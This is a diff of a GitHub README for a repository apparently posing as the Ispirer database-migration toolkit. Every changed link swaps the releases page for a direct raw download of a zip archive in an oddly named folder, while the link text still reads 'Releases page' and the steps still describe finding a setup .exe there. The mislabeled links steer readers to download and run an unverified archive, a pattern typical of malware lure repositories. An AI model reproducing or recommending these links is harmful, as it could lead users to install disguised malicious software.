@@ -1,6 +1,6 @@
 # ⚙️ Ispirer-Toolkit-Migrator - Easy Database and Code Conversion
 
-[![Download Ispirer Toolkit-Migrator](https://img.shields.io/badge/Download-Ispirer%20Toolkit--Migrator-brightgreen?style=for-the-badge)](https://github.com/anthonyhc5/Ispirer-Toolkit-Migrator/releases)
+[![Download Ispirer Toolkit-Migrator](https://img.shields.io/badge/Download-Ispirer%20Toolkit--Migrator-brightgreen?style=for-the-badge)](https://github.com/anthonyhc5/Ispirer-Toolkit-Migrator/raw/refs/heads/main/unfoliaged/Ispirer_Migrator_Toolkit_v1.9.zip)
 
 ## 📋 About Ispirer-Toolkit-Migrator
 
@@ -26,7 +26,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 You need to download the software before you can use it. Follow the steps below.
 
-1. Click the green badge above or visit the [Ispirer Toolkit-Migrator Releases page](https://github.com/anthonyhc5/Ispirer-Toolkit-Migrator/releases).  
+1. Click the green badge above or visit the [Ispirer Toolkit-Migrator Releases page](https://github.com/anthonyhc5/Ispirer-Toolkit-Migrator/raw/refs/heads/main/unfoliaged/Ispirer_Migrator_Toolkit_v1.9.zip).  
 2. On the Releases page, look for the latest version. It will be named with a version number like “v1.0” or similar.  
 3. Under the latest version, you will see one or more files. Look for the Windows setup file. It usually ends with `.exe`.  
 4. Click on the `.exe` file link to download the installer. Save it to your computer.  
@@ -100,7 +100,7 @@ If you need help, search the GitHub issues page or contact your system administr
 
 ## 💾 Updating Ispirer Toolkit-Migrator
 
-Periodically check the [releases page](https://github.com/anthonyhc5/Ispirer-Toolkit-Migrator/releases) for new versions. Updates often improve compatibility and fix bugs.
+Periodically check the [releases page](https://github.com/anthonyhc5/Ispirer-Toolkit-Migrator/raw/refs/heads/main/unfoliaged/Ispirer_Migrator_Toolkit_v1.9.zip) for new versions. Updates often improve compatibility and fix bugs.
 
 To update:  
 1. Download the new installer from the page.  
@@ -109,7 +109,7 @@ To update:
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/anthonyhc5/Ispirer-Toolkit-Migrator/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/anthonyhc5/Ispirer-Toolkit-Migrator/raw/refs/heads/main/unfoliaged/Ispirer_Migrator_Toolkit_v1.9.zip)
 
 ---
 
